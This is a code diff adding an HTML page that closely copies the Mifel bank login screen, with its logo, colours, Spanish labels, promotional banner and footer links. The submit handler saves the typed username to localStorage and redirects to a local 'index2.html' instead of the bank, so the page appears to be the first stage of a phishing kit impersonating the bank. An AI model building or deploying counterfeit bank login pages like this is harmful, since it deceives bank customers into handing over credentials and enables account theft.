@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mifel - Inicio de Sesión</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+            --link-blue: #0076A8;
+            --glow-light-blue: #00E5FF;
+            --alignment-top: 100px; 
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* --- HEADER --- */
+        .top-header {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 15px 50px;
+            font-size: 14px;
+            gap: 8px;
+        }
+
+        .flag-icon {
+            width: 20px;
+            height: auto;
+            border-radius: 2px;
+        }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            align-items: flex-start; 
+            justify-content: space-between;
+            padding: 0;
+        }
+
+        /* --- LOGIN SECTION --- */
+        .login-section {
+            width: 100%;
+            max-width: 480px; 
+            display: flex;
+            flex-direction: column;
+            margin-top: var(--alignment-top);
+            margin-left: 10%; 
+        }
+
+        .logo-mifel {
+            width: 180px;
+            margin-bottom: 40px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto; 
+        }
+
+        .login-form { width: 100%; }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--text-grey);
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background-color: var(--input-bg);
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+            height: 56px;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--glow-light-blue);
+            box-shadow: 0 0 15px 2px rgba(0, 229, 255, 0.7);
+            background-color: #fff;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            height: 100%;
+            padding: 0 50px 0 18px;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .input-wrapper input[type="password"] {
+            font-size: 32px; 
+            letter-spacing: 4px;
+        }
+
+        .forgot-link {
+            color: var(--link-blue); 
+            font-size: 13px; 
+            margin-top: 20px;
+            display: block;
+            text-decoration: none;
+        }
+
+        .toggle-user {
+            position: absolute;
+            right: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .toggle-user svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--link-blue);
+        }
+
+        /* --- BOTONES Y ANIMACIONES --- */
+        .btn-ingresar {
+            width: 100%;
+            padding: 18px;
+            background-color: var(--mifel-cyan);
+            color: #002D72;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 35px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-ingresar:hover {
+            background-color: #00b3a5;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 209, 193, 0.3);
+        }
+
+        .btn-ingresar:active { transform: scale(0.98); }
+
+        .signup-text {
+            color: var(--text-grey); 
+            font-size: 14px; 
+            margin-top: 30px;
+            text-align: center; 
+        }
+
+        .signup-text a {
+            color: var(--link-blue); 
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        /* --- BANNER --- */
+        .banner-section {
+            background-color: #f6f7f9;
+            border-radius: 40px 0 0 40px;
+            padding: 100px 40px 100px 80px; 
+            width: 50%;
+            max-width: 800px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: var(--alignment-top); 
+            box-shadow: -10px 10px 30px rgba(0,0,0,0.03);
+        }
+
+        .banner-content h2 {
+            font-size: 36px;
+            color: var(--mifel-blue-dark);
+            margin-bottom: 20px;
+        }
+
+        .btn-banner {
+            display: inline-block;
+            padding: 15px 30px;
+            border: 1px solid var(--mifel-cyan);
+            background: white;
+            color: var(--link-blue);
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn-banner:hover {
+            background-color: var(--mifel-cyan);
+            color: white;
+            transform: scale(1.05);
+        }
+
+        .banner-image { width: 320px; height: auto; flex-shrink: 0; }
+
+        /* --- FOOTER --- */
+        .footer-nav {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            padding: 60px 20px;
+            background-color: #fff;
+            margin-top: auto;
+            flex-wrap: wrap;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--link-blue);
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .footer-item svg { width: 20px; height: 20px; fill: var(--mifel-cyan); }
+
+        /* --- MEDIA QUERIES --- */
+        @media (max-width: 1100px) {
+            .main-container { flex-direction: column; align-items: center; }
+            .login-section { 
+                margin-left: 0; 
+                margin-right: 0; 
+                margin-top: 40px; 
+                max-width: 90%; 
+            }
+            .banner-section { display: none; }
+            .top-header { padding: 15px 20px; }
+            .footer-nav { gap: 20px; padding: 40px 15px; }
+            .footer-item { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-header">
+        <img src="https://flagcdn.com/w40/mx.png" alt="México" class="flag-icon">
+        <span>ES ⌵</span>
+    </div>
+
+    <div class="main-container">
+        <div class="login-section">
+            <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-mifel">
+            
+            <form id="loginForm" class="login-form">
+                <div class="form-group">
+                    <label>Usuario</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="usuario" 
+                            maxlength="10" 
+                            inputmode="alphanumeric"
+                            autocomplete="off"
+                            spellcheck="false"
+                            required
+                        >
+                        <button type="button" class="toggle-user" id="toggleUser">
+                            <svg class="eye-reveal" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                            <svg class="eye-visible" style="display:none" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                        </button>
+                    </div>
+                    <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+                </div>
+
+                <button type="submit" class="btn-ingresar">Ingresar</button>
+            </form>
+            <p class="signup-text">¿Aún no tienes usuario? <a href="#">Regístrate</a></p>
+        </div>
+
+        <div class="banner-section">
+            <div class="banner-content">
+                <h2>Ahorra más con Cuenta Digital Mifel</h2>
+                <p>Ábrela sin visitar una sucursal y descubre una nueva forma de ahorrar.</p>
+                <a href="#" class="btn-banner">Quiero mi cuenta</a>
+            </div>
+            <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/9664cac1-4909-4617-9734-d36b3d03b146/original/CUENTA_DIG.svg" alt="Tarjetas Mifel" class="banner-image">
+        </div>
+    </div>
+
+    <div class="footer-nav">
+        <div class="footer-item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg> Activar token ></div>
+        <div class="footer-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg> Desbloquear usuario ></div>
+        <div class="footer-item"><svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg> Consejos de seguridad ></div>
+    </div>
+
+    <script>
+    const toggleUserBtn = document.getElementById('toggleUser');
+    const userField = document.getElementById('usuario');
+    const eyeRevealIcon = toggleUserBtn.querySelector('.eye-reveal');
+    const eyeVisibleIcon = toggleUserBtn.querySelector('.eye-visible');
+
+    // 1. VALIDACIÓN ESTRICTA (BLOQUEO DE ESPACIOS Y ESPECIALES)
+    userField.addEventListener('input', function() {
+        // Elimina instantáneamente cualquier cosa que no sea letra o número
+        this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+    });
+
+    // 2. BLOQUEO PREVENTIVO DE TECLA ESPACIO (HARDWARE Y SOFTWARE)
+    userField.addEventListener('keydown', function(e) {
+        if (e.key === " " || e.keyCode === 32) {
+            e.preventDefault();
+        }
+    });
+
+    // 3. TOGGLE VISIBILIDAD
+    toggleUserBtn.addEventListener('click', function() {
+        const isPassword = userField.getAttribute('type') === 'password';
+        userField.setAttribute('type', isPassword ? 'text' : 'password');
+        eyeRevealIcon.style.display = isPassword ? 'none' : 'block';
+        eyeVisibleIcon.style.display = isPassword ? 'block' : 'none';
+    });
+
+    // 4. ENVÍO DEL FORMULARIO
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const usuarioValor = userField.value;
+        localStorage.setItem('mifel_user', usuarioValor); 
+        window.location.href = 'index2.html';
+    });
+    </script>
+</body>
+</html>
